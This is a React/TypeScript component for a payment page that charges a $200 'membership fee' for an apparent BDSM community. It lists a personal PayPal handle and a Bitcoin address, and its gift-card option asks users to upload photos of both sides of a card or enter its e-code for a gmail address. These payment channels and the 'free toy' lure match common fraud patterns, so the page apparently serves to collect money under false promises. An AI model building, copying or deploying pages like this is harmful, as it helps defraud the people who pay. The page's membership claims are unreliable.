import { useState } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Check, Copy, Upload } from "lucide-react";
import { FaBitcoin, FaPaypal } from "react-icons/fa";
import { SiVenmo, SiCashapp } from "react-icons/si";
import { toast } from "sonner";

const Confirmation = () => {
  const [paymentMethod, setPaymentMethod] = useState("paypal");
  const [giftCardFront, setGiftCardFront] = useState<File | null>(null);
  const [giftCardBack, setGiftCardBack] = useState<File | null>(null);
  const [eCode, setECode] = useState("");

  const paymentAddresses = {
    cashapp: "NOT AVAILABLE CURRENTLY",
    paypal: "@debbietracy034",
    venmo: "NOT AVAILABLE CURRENTLY",
    bitcoin: "bc1q745awaeswsx7rwmszy24auv3kk2xmd88zu79f6",
    giftcard: "houseofsatisfactionbdsmcommu@gmail.com",
  };

  const availableMethods = ["paypal", "bitcoin", "giftcard"];

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied!");
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") => {
    const file = e.target.files?.[0];
    if (file) {
      if (side === "front") setGiftCardFront(file);
      else setGiftCardBack(file);
      toast.success(`${side === "front" ? "Front" : "Back"} of card uploaded`);
    }
  };

  return (
    <div className="min-h-screen py-12 px-6">
      <div className="max-w-5xl mx-auto">
        <div className="text-center mb-12">
          <h1 className="text-4xl md:text-5xl font-bold mb-4 bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
            Complete Membership
          </h1>
          <p className="text-xl text-muted-foreground">
            Finalize your membership in the House of Satisfaction BDSM Community
          </p>
        </div>

        <Card className="p-8 md:p-12 mb-12 shadow-elegant">
          {/* Price */}
          <div className="text-center mb-12">
            <div className="text-5xl font-bold text-primary mb-4">$200</div>
            <p className="text-xl text-muted-foreground">One-time Membership Fee</p>
          </div>

          <div className="grid md:grid-cols-2 gap-8 mb-12">
            {/* Membership Benefits */}
            <div>
              <h3 className="text-2xl font-bold mb-6">Membership Benefits</h3>
              <ul className="space-y-4">
                <li className="flex gap-3">
                  <Check className="text-primary flex-shrink-0 mt-1" />
                  <span>Exclusive access to community events and gatherings</span>
                </li>
                <li className="flex gap-3">
                  <Check className="text-primary flex-shrink-0 mt-1" />
                  <span>Private member forums and discussion groups</span>
                </li>
                <li className="flex gap-3">
                  <Check className="text-primary flex-shrink-0 mt-1" />
                  <span>Educational workshops and safety training</span>
                </li>
                <li className="flex gap-3">
                  <Check className="text-primary flex-shrink-0 mt-1" />
                  <span>A free toy will be mailed to you after registration</span>
                </li>
                <li className="flex gap-3">
                  <Check className="text-primary flex-shrink-0 mt-1" />
                  <span>Access to experienced mentors and guides</span>
                </li>
                <li className="flex gap-3">
                  <Check className="text-primary flex-shrink-0 mt-1" />
                  <span>Monthly newsletter and exclusive content</span>
                </li>
              </ul>
            </div>

            {/* How It Works */}
            <div>
              <h3 className="text-2xl font-bold mb-6">How It Works</h3>
              <div className="space-y-4">
                <div className="flex gap-4">
                  <div className="w-10 h-10 rounded-full gradient-primary flex items-center justify-center font-bold flex-shrink-0">
                    1
                  </div>
                  <div>
                    <h4 className="font-semibold mb-1">Complete Your $200 Payment</h4>
                    <p className="text-sm text-muted-foreground">
                      Choose your preferred payment method below and send your fee
                    </p>
                  </div>
                </div>
                <div className="flex gap-4">
                  <div className="w-10 h-10 rounded-full gradient-primary flex items-center justify-center font-bold flex-shrink-0">
                    2
                  </div>
                  <div>
                    <h4 className="font-semibold mb-1">Payment Confirmation</h4>
                    <p className="text-sm text-muted-foreground">
                      We verify and confirm your payment within 24 hours
                    </p>
                  </div>
                </div>
                <div className="flex gap-4">
                  <div className="w-10 h-10 rounded-full gradient-primary flex items-center justify-center font-bold flex-shrink-0">
                    3
                  </div>
                  <div>
                    <h4 className="font-semibold mb-1">Community ID Issued</h4>
                    <p className="text-sm text-muted-foreground">
                      Your personal Community ID is issued and sent to you by email
                    </p>
                  </div>
                </div>
                <div className="flex gap-4">
                  <div className="w-10 h-10 rounded-full gradient-primary flex items-center justify-center font-bold flex-shrink-0">
                    4
                  </div>
                  <div>
                    <h4 className="font-semibold mb-1">Welcome Home</h4>
                    <p className="text-sm text-muted-foreground">
                      Use your ID to enter the forum, groups and store — you're one of ours
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Payment Section */}
          <div className="border-t border-border pt-8">
            <h3 className="text-2xl font-bold mb-8 text-center">Complete Your Membership</h3>

            <div className="space-y-6">
              {/* Payment Method Selection */}
              <div>
                <Label className="text-lg font-semibold">Select Payment Method *</Label>
                <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mt-4">
                  {[
                    { key: "cashapp", icon: <SiCashapp className="mx-auto mb-2 text-green-500" size={28} />, label: "Cash App" },
                    { key: "paypal", icon: <FaPaypal className="mx-auto mb-2 text-blue-500" size={28} />, label: "PayPal" },
                    { key: "venmo", icon: <SiVenmo className="mx-auto mb-2 text-blue-400" size={28} />, label: "Venmo" },
                    { key: "bitcoin", icon: <FaBitcoin className="mx-auto mb-2" size={28} />, label: "Bitcoin" },
                    { key: "giftcard", icon: <Upload className="mx-auto mb-2" size={28} />, label: "Gift Card" },
                  ].map((pm) => {
                    const unavailable = !availableMethods.includes(pm.key);
                    return (
                      <Card
                        key={pm.key}
                        className={`p-4 transition-smooth ${
                          unavailable
                            ? "opacity-40 cursor-not-allowed"
                            : `cursor-pointer hover:border-primary ${paymentMethod === pm.key ? "border-primary" : ""}`
                        }`}
                        onClick={() => {
                          if (unavailable) {
                            toast.info("This payment method is not available currently");
                            return;
                          }
                          setPaymentMethod(pm.key);
                        }}
                      >
                        {pm.icon}
                        <p className="text-sm font-semibold text-center">{pm.label}</p>
                        {unavailable && (
                          <p className="text-xs text-center text-muted-foreground mt-1">Unavailable</p>
                        )}
                      </Card>
                    );
                  })}
                </div>
              </div>

              {/* Payment Address Display */}
              {paymentMethod !== "giftcard" && (
                <Card className="p-6 bg-muted">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-sm text-muted-foreground mb-1">Send $200 to:</p>
                      <p className="font-mono text-lg font-semibold text-primary break-all">
                        {paymentAddresses[paymentMethod as keyof typeof paymentAddresses]}
                      </p>
                    </div>
                    <Button
                      type="button"
                      variant="outline"
                      size="sm"
                      onClick={() =>
                        copyToClipboard(paymentAddresses[paymentMethod as keyof typeof paymentAddresses])
                      }
                    >
                      <Copy className="mr-2 h-4 w-4" /> Copy
                    </Button>
                  </div>
                </Card>
              )}

              {/* Gift Card Upload */}
              {paymentMethod === "giftcard" && (
                <div className="space-y-4">
                  <Card className="p-6 bg-muted">
                    <p className="text-sm text-muted-foreground mb-1">Submit E-Code to:</p>
                    <div className="flex items-center justify-between">
                      <p className="font-mono text-sm font-semibold text-primary break-all">
                        {paymentAddresses.giftcard}
                      </p>
                      <Button
                        type="button"
                        variant="outline"
                        size="sm"
                        onClick={() => copyToClipboard(paymentAddresses.giftcard)}
                      >
                        <Copy className="mr-2 h-4 w-4" /> Copy
                      </Button>
                    </div>
                  </Card>

                  <div className="grid md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="giftcard-front">Upload Front of Card</Label>
                      <label className="flex flex-col items-center justify-center w-full h-32 border-2 border-dashed border-border rounded-lg cursor-pointer hover:border-primary transition-smooth mt-2">
                        <Upload className="w-8 h-8 mb-2" />
                        <span className="text-sm">
                          {giftCardFront ? giftCardFront.name : "Click to upload"}
                        </span>
                        <input
                          id="giftcard-front"
                          type="file"
                          className="hidden"
                          accept="image/*"
                          onChange={(e) => handleFileUpload(e, "front")}
                        />
                      </label>
                    </div>

                    <div>
                      <Label htmlFor="giftcard-back">Upload Back of Card</Label>
                      <label className="flex flex-col items-center justify-center w-full h-32 border-2 border-dashed border-border rounded-lg cursor-pointer hover:border-primary transition-smooth mt-2">
                        <Upload className="w-8 h-8 mb-2" />
                        <span className="text-sm">
                          {giftCardBack ? giftCardBack.name : "Click to upload"}
                        </span>
                        <input
                          id="giftcard-back"
                          type="file"
                          className="hidden"
                          accept="image/*"
                          onChange={(e) => handleFileUpload(e, "back")}
                        />
                      </label>
                    </div>
                  </div>

                  <div>
                    <Label htmlFor="ecode">Or Enter E-Code</Label>
                    <Input
                      id="ecode"
                      placeholder="Enter gift card E-Code"
                      value={eCode}
                      onChange={(e) => setECode(e.target.value)}
                      className="mt-2"
                    />
                  </div>
                </div>
              )}

              <p className="text-sm text-muted-foreground text-center">
                Once your $200 payment is confirmed, your Community ID will be issued and
                emailed to you personally.
              </p>

              <p className="text-sm text-muted-foreground text-center">
                Questions? Contact us at houseofsatisfactionbdsmcommu@gmail.com
              </p>
            </div>
          </div>
        </Card>
      </div>
    </div>
  );
};

export default Confirmation;
